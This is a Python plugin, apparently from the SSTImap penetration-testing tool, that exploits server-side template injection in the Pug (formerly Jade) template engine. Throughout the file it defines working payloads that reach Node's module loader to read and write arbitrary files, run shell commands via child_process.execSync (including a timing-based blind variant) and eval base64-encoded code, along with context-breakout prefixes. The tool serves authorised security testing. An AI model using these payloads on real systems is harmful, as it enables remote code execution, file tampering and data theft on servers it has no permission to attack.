from plugins.languages import javascript
from utils import rand


class Pug(javascript.Javascript):
    generic_plugin = True
    priority = 5
    plugin_info = {
        "Description": """Pug template engine formerly known as Jade""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://pugjs.org/",
            "Github: https://github.com/pugjs/pug",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': '{code}',
                'header': '\n= {header[0]}+{header[1]}\n',
                'trailer': '\n= {trailer[0]}+{trailer[1]}\n',
                'test_render': f'|#{{typeof({rand.randints[0]})+{rand.randints[1]}}}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            # No evaluate_blind here, since we've no sleep, we'll use inject
            'write': {
                'call': 'inject',
                # Payloads calling inject must start with \n to break out already started lines
                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')
""",
                'truncate': """\n- global.process.mainModule.require('fs').writeFileSync('{path}', '')
"""
            },
            'read': {
                'call': 'render',
                'read': """= global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'call': 'render',
                'md5': """= global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind': {
                'call': 'inject',
                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                # TODO: use another function.
                # Payloads calling inject must start with \n to break out already started lines
                # It's two lines command to avoid false positive with Javascript module
                'execute_blind': """
- x = global.process.mainModule.require
- x('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')
"""
            },
            'execute': {
                'call': 'render',
                'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'evaluate': {
                'evaluate': """= eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """global.process.mainModule.require('os').platform()"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # Attribute close a(href=\'%s\')
            {'level': 1, 'prefix': '{closure})', 'suffix': '//', 'closures': {1: javascript.ctx_closures[1]}},
            # String interpolation #{
            {'level': 2, 'prefix': '{closure}}}', 'suffix': '//', 'closures': javascript.ctx_closures},
            # Code context
            {'level': 2, 'prefix': '{closure}\n', 'suffix': '//', 'closures': javascript.ctx_closures},
        ])

    language = 'javascript'
